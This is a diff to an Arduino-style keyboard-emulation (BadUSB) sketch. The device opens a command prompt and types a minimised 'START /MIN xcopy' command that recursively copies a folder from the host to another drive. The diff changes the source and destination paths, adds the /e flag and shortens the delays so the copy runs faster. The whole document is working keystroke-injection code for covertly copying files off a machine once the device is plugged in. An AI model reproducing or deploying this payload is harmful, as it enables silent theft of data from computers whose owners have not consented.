@@ -75,8 +75,9 @@ void opencmd(){
   Keyboard.releaseAll();
   delay(400);
   Keyboard.print("cmd");
-  delay(400);
+  delay(200);
   typeKey(KEY_RETURN);
+  delay(500);
 }
 
 
@@ -89,16 +90,13 @@ void exit(){
 void setup()
 { 
   Keyboard.begin();
-  String orig = "D:\\Fry\\Desktop\\davidhasselhoff";
-  String dest = "C:\\Users\\Public\\Documents";
-  
-  delay(10000);
+  String orig = "D:\\Escritorio";
+  String dest = "E:\\test";
+  delay(500);
   opencmd();
-  
-  esp_print("START /MIN xcopy "+orig+" "+dest);
+  esp_print("START /MIN xcopy "+orig+" "+dest+" /e");
   typeKey(KEY_RETURN);
-
-  delay(100);
+  delay(50);
   exit();
   Keyboard.end();
 }
